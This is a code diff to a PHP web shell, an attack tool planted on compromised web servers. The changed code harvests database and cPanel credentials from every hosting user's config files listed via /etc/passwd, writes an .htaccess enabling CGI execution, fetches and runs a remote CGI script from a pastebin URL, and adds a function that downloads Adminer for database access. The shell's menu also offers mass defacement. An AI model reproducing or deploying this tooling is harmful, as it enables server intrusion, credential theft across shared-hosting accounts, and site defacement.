@@ -186,6 +186,11 @@ if (!isset($_SESSION[md5(sha1($_SERVER['HTTP_HOST'])) ])) {
 		width: 20px;
 		height: 20px;
 	}
+	.iframe {
+		width: 100vw;
+		height: 100vh;
+		position: relative;"
+	}
 	</style>
 </head>
 <body>
@@ -297,8 +302,8 @@ function config() {
 	if (!file_exists('.config/config')) {
 		mkdir(".config/config");
 	}
-	$isi = "Options FollowSymLinks MultiViews Indexes ExecCGI\nRequire None\nSatisfy Any\nAddType application/x-httpd-cgi .cin\nAddHandler cgi-script .cin\nAddHandler cgi-script .cin";
 	if (!file_exists('.config/config/.htaccess')) {
+		$isi = "Options FollowSymLinks MultiViews Indexes ExecCGI\nRequire None\nSatisfy Any\nAddType application/x-httpd-cgi .cin\nAddHandler cgi-script .cin\nAddHandler cgi-script .cin";
 		file_put_contents('.config/config/.htaccess', $isi);
 	}
 	if (preg_match("/vhosts|vhost/", $dir)) {
@@ -324,7 +329,7 @@ function config() {
 			else {
 				preg_match_all('/(.*?):x:/', $passwd, $user_config);
 				foreach ($user_config[1] as $user_idx) {
-					$user_config_dir = "/home/$user_idx/public_html/";
+					$user_config_dir = "/home/$user_idx/public_html";
 					if (is_readable($user_config_dir)) {
 						$grab_config = array(
 							"/home/$user_idx/.my.cnf" => "cpanel",
@@ -351,8 +356,8 @@ function config() {
 							"$user_config_dir/application/config/database.php" => "Ellislab"
 						);
 						foreach ($grab_config as $config => $nama_config) {
-							$ambil_config = file_get_contents($config);
-							if ($ambil_config != '') {
+							$ambil_config = @file_get_contents($config);
+							if (!empty($ambil_config)) {
 								$file_config = fopen(".config/config/$user_idx-$nama_config.txt", "w");
 								fputs($file_config, $ambil_config);
 							}
@@ -361,8 +366,9 @@ function config() {
 				}
 			}
 		}
-		echo "<center><a href='?dir=$dir/.config/config'><font color=lime>Done</font></a></center>";
+		echo "<center><a href='?do=open&dir=" . getcwd() . $sep . $dir."/.config/config'>Done</a></center>";
 	}
+	die();
 }
 
 function mass_deface() {
@@ -381,7 +387,7 @@ function info() {
    	<h5><?php echo php_uname();?></h5>
    	<h5>Disabled Function : <?php echo $dist; ?> </h5>
 		<textarea class="form-control" id="textarea" readonly /><?php
-	print_r($_SERVER);
+	var_dump($_SERVER);
 ?></textarea>
 	</center>
 	<?php
@@ -801,9 +807,11 @@ function cgi_shell() {
 		if (!file_exists('.config')) {
 			mkdir('.config');
 		}
-		file_put_contents('.config/.htaccess', "AddHandler cgi-script .izo\nOptions -Indexes");
-		file_put_contents('.config/cgi.izo', file_get_contents('https://pastebin.com/raw/MUD0EPjb'));
-		echo ("<iframe src='.config/cgi.izo' width='100%' height='100%' frameborder='0' scrolling='no'></iframe>");
+		if(!(file_exists('.config/cgi.izo') AND file_exists('.config/cgi.izo'))) {
+			file_put_contents('.config/.htaccess', "AddHandler cgi-script .izo\nOptions -Indexes");
+			file_put_contents('.config/cgi.izo', file_get_contents('https://pastebin.com/raw/MUD0EPjb'));
+		}
+		echo ("<iframe src='.config/cgi.izo' class='iframe' frameborder='0' scrolling='no'></iframe>");
 		die();
 	}
 
@@ -943,6 +951,17 @@ function newfile($file)
 		alert("Permission Denied Or File Exists");
 	}
 }
+function adminer()
+{
+	if(!file_exists('.config')) {
+	mkdir('.config');
+	}
+	if(!file_exists('.config/adminer.php')) {
+		file_put_contents('.config/adminer.php', file_get_contents('https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php'));
+	}
+	echo "<iframe src='.config/adminer.php' class='iframe' frameborder='0' scrolling='no'></iframe>";
+	die();
+}
 // END FUNCTION
 
 ?>
@@ -966,6 +985,7 @@ function newfile($file)
 					<li><a href='?do=cgi'>CGI Shell</a></li>
 					<li><a href='?do=deface'>Auto Deface</a></li>
 					<li><a href='?do=shortlink'>Shortlink Generator</a></li>
+					<li><a href='?do=adminer'>Adminer</a></li>
 				</ul>
 			</li>
 			<li><a href='?do=logout'><span class="glyphicon glyphicon-log-in"></span>
@@ -1043,6 +1063,9 @@ if(isset($_GET['do'])):
 	}
 	elseif($_GET['do'] == 'touch' and isset($_GET['files'])) {
 		newfile($_GET['files']);
+	}
+	elseif ($_GET['do'] == 'adminer') {
+		adminer();
 	}
 endif;
 $dir = scandir(getcwd());
